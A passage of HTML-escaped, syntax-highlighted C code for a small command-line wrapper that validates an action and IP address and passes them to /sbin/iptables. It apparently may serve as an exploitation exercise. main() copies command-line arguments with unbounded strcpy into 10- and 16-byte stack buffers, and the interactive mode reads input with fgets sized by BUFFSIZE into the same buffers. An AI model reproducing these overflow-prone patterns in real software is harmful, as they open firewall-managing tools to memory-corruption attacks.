    	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inet_pton&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AF_INET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ipAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sin_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;isValidAction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;strncpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;allow&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;restrict&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;show&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;cmdAR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/sbin/iptables&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;INPUT&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
       	&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;-p&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
       	&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;all&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
       	&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;-s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;-j&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
       	&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;ACCEPT&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;cmdShow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/sbin/iptables&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;-L&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
       	&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;INPUT&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inputAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inputAction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Entering interactive mode&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Action(allow|restrict|show): &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;fgets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inputAction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BUFFSIZE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;fflush&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;IP address: &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;fgets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inputAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BUFFSIZE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;fflush&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;inputAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inputAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;isValidAction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inputAction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;isValidIpAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inputAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Usage: %s allow|restrict|show IP&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;strcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inputAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;strcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inputAction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]){&lt;/span&gt;
	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;isAction&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;isIPAddr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;pid_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;child_pid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inputAction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inputAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Usage: %s allow|restrict|show IP_ADDR&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strstr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;-i&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inputAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inputAction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;strcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inputAction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;strcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inputAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;isAction&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;isValidAction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inputAction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;isIPAddr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;isValidIpAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inputAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;isAction&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;isIPAddr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
